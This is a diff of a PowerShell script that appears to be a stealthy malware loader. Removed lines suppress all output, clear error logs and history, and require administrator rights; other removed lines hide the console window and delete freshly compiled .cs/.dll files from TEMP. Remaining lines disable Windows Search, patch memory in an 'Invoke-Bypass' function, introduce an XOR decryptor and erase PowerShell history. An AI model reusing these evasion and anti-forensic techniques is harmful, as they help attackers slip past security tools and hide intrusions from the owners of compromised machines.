@@ -1,23 +1,3 @@
-[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
-param()
-
-Set-StrictMode -Version Latest
-
-$VerbosePreference = 'SilentlyContinue'
-$DebugPreference = 'SilentlyContinue'
-$InformationPreference = 'SilentlyContinue'
-$WarningPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'SilentlyContinue'
-$ConfirmPreference = 'None'
-$WhatIfPreference = $false
-$PSModuleAutoLoadingPreference = 'None'
-$MaximumHistoryCount = 0
-
-*> $null
-$Error.Clear()
-
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { exit }
-
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
 
 Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
@@ -64,14 +44,6 @@ function Invoke-Bypass {
         $v.Invoke($t, 0x1000, $old, [ref]$null)
     } catch {}
 }
-
-
-Add-Type -Name Window -Namespace Console -MemberDefinition @'
-[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'@ -ErrorAction SilentlyContinue
-[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
-
 
 # ================================================================
 #  ★★★ ২. XOR ডিক্রিপ্টর ★★★
@@ -192,13 +164,3 @@ $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerS
 if (Test-Path $historyPath) {
     Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
 }
-
-
-Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-
-$bytes = $null; $kernel = $null; $type = $null
-[GC]::Collect(); [GC]::WaitForPendingFinalizers()
-
